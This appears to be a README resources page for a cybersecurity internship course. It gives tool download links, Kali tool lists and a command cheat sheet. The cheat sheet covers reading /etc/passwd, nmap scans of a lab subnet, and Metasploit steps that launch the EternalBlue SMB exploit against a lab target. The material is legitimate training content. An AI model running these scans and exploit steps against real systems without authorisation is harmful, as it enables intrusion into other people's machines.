# 🔗 Resources & References

> **NetworkWalks Academy | Batch B082 | August 2026**

---

## 📋 Overview

A curated collection of tools, references, and cheat sheets for the B082 Cybersecurity Internship Program.

---

## 🛠️ Tools & Downloads

### Essential Software

| Tool | Purpose | Download Link |
|---|---|---|
| 📦 **7-Zip** | Archive extraction (.7z, .tar.gz) | [Download](https://7-zip.org/download.html) |
| 🧰 **Oracle VirtualBox** | Hypervisor & Virtual Machine Manager | [Download](https://virtualbox.org/wiki/Downloads) |
| 🐉 **Kali Linux** | Penetration Testing OS (VirtualBox Image) | [Download](https://kali.org/get-kali) |
| 🪟 **Windows ISOs** | Victim Target Environments | [Evaluation Center](https://www.microsoft.com/en-us/evalcenter) |
| 💀 **Metasploitable 2** | Vulnerable Target VM | [Download](https://sourceforge.net/projects/metasploitable/) |

### Kali Linux Built-in Toolset

| Category | Tools Available in Lab |
|---|---|
| 🔍 **Reconnaissance & OSINT** | Maltego, theHarvester, Recon-ng, Shodan, WHOIS, DNSenum |
| 📡 **Scanning & Enumeration** | Nmap, Zenmap, Nessus, Nikto, Masscan |
| ⚔️ **Exploitation** | Metasploit Framework, Burp Suite, SQLMap, SearchSploit |
| 🔓 **Password Attacks** | John The Ripper (JTR), Hydra, Hashcat, Medusa |
| 🦈 **Traffic Analysis** | Wireshark, tcpdump, Ettercap, TShark |
| 📝 **Documentation** | CherryTree, KeepNote, Obsidian |

---

## 📚 NetworkWalks Official Channels

- 🌐 **Website:** [networkwalks.com](https://www.networkwalks.com)
- 🏢 **LinkedIn Page:** [NetworkWalks Company](https://linkedin.com/company/networkwalks/)
- 👨‍🏫 **Instructor Profile:** [Waqas Karim CCIE](https://linkedin.com/in/waqaskarim/)
- 📱 **WhatsApp Community:** [Join Group](https://chat.whatsapp.com/DBTvMHehxiaBVT3Y58FWRh)
- ✈️ **Telegram Channel:** [Join Channel](https://t.me/+mi3ANgkw3vpkYTY0)

---

## 📖 Useful Commands Cheat Sheet

### Linux & Networking Essentials

```bash
# System & user identity
uname -a                 # Kernel & architecture
whoami                   # Current active user
id                       # UID, GID, and groups

# Network configuration & verification
ifconfig                 # Display active network interfaces
ip a                     # Modern IP address display
ip route                 # View default gateway routing table
netstat -tuln            # Active listening TCP/UDP ports

# File & search operations
ls -lah                  # Detailed file listing including hidden
cat /etc/passwd          # Inspect system user accounts
find / -name "*.conf"    # Locate configuration files
```

### Nmap Network Scanning (`10.0.2.0/24` Lab Subnet)

```bash
# Host discovery on the lab subnet
nmap -sn 10.0.2.0/24

# Fast scan top ports
nmap -T4 -F 10.0.2.15

# Full TCP port scan with OS & service version detection
nmap -sS -sV -O -p- 10.0.2.15

# Aggressive scan with default NSE scripts
nmap -A -v 10.0.2.15

# UDP scan for common services (DNS, SNMP, DHCP)
nmap -sU --top-ports 50 10.0.2.15
```

### Metasploit Framework Basics

```bash
# Launch framework console
msfconsole -q

# Search & select modules
search type:exploit name:smb
use exploit/windows/smb/ms17_010_eternalblue

# Configure target & payload parameters
set RHOSTS 10.0.2.x
set LHOST 10.0.2.15
show options

# Launch exploit
exploit
```

---

## 📞 Support & Community

| Channel | Purpose | Contact / Link |
|---|---|---|
| **Lead Instructor** | Technical queries & guidance | Via WhatsApp Class Group |
| **Program Coordinator** | Administrative & submission support | Via WhatsApp Class Group |
| **Cisco NetAcad Support** | Academy enrollment | netacadsupport@netacad.com |

---

> 📂 [Back to Main README](../README.md)
